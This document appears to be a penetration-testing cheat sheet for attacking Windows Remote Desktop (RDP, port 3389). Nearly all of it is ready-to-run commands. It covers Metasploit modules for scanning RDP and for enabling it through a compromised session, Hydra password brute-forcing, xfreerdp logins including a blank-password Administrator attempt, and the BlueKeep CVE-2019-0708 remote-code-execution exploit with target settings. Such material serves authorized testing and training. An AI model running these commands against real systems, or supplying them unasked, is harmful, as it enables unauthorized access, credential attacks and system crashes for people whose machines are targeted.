# RDP

**RDP (Remote Desktop Protocol)**
**Description**: RDP (Remote Desktop Protocol) allows remote graphical access to Windows systems
**Ports**: TCP 3389
**Known Vulnerabilities**: Weak credentials, BlueKeep vulnerability (CVE-2019-0708)

# Check and Enable RDP

```shell
use auxiliary/scanner/rdp/rdp_scanner # Check for exposed RDP services

# Enabling the RDP service using windows post exploitation module
use post/windows/manage/enable_rdp
set SESSION <session_number>
```

# Brute-force

```shell
hydra -L <user_wordlists> -P <password_wordlists> rdp://<target_IP>:<port>
hydra -L <user_wordlists> -P <password_wordlists> rdp://<target_IP>:<port> -s <port> # Use -s if port ≠ 3389
```

# Accessing RDP

```shell
xfreerdp /u:<username> /p:<password> /v:<target_IP>:<port>
# Initiates a Remote Desktop Protocol (RDP) session to the target using provided credentials.
# Useful for accessing Windows systems with RDP enabled.

xfreerdp /v:<target_IP> /u:Administrator /cert:ignore
# This command connects to the Remote Desktop Protocol (RDP) service on the target using the username Administrator with a blank password, while ignoring any certificate warnings.
```

# BlueKeep (CVE-2019-0708)

```shell
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
# Scans for systems vulnerable to BlueKeep (CVE-2019-0708), a critical RDP remote code execution flaw.
# Affects unpatched Windows XP to Windows 7 and Windows Server 2003 to 2008 R2.

use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
# Exploits the BlueKeep vulnerability (CVE-2019-0708) to achieve remote code execution via RDP.
# Targets unpatched Windows XP, 7, Server 2003, and 2008 (without Network Level Authentication).
# WARNING: This exploit is unstable and may crash the target system.
set RHOSTS <target_IP>
set target 2 # Windows 7 SP1 / 2008 R2 (x64, VirtualBox 6)
run
```
